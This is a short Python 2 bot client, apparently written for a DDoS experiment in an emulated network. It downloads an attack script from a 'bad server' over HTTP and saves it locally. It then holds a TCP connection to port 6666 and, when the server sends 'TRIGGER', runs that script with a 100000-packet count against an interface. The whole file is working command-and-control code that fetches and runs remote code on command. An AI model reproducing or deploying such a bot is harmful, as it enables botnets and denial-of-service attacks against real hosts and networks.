from argparse import ArgumentParser
from socket import socket, SOCK_STREAM, AF_INET
from urllib import urlretrieve
from sys import stderr, exit
from os import system

def sock_create(addr):
    sock=None
    try:
        sock=socket(AF_INET, SOCK_STREAM)
        sock.connect(addr)
        return sock
    except Exception as e:
        stderr.write('[-]Error in connecting to bad_server at {}: {}'.format(addr, e))
        if sock!=None:
            sock.close()
        exit(-1)

def connect_to_svr(bad_addr, name):
    sock=sock_create((bad_addr, 6666))

    while True:
        cmdr=sock.recv(512)
        if 'TRIGGER'==cmdr:
            #trigger attack
            system('python2 try/{}.py -i {}-eth0 -n 100000'.format(name, name))
        elif 'EXIT'==cmdr:
            break

def fetch_file(bad_addr, name):
    try:
        urlretrieve('http://{}:8000/utils/vec.py'.format(bad_addr), 'try/{}.py'.format(name))
    except Exception as e:
        stderr.write('[-]Error in fetching vector file from server at {}: {}'.format(bad_addr, e))
        exit(-1)

if __name__=='__main__':
    parser=ArgumentParser()
    parser.add_argument('-a', '--addr', required=True, metavar='', dest='bad_addr', help='The address of the bad server')
    parser.add_argument('-n', '--name', required=True, metavar='', dest='name', help='The name of the host')
    args=parser.parse_args()

    fetch_file(args.bad_addr, args.name)

    connect_to_svr(args.bad_addr, args.name)
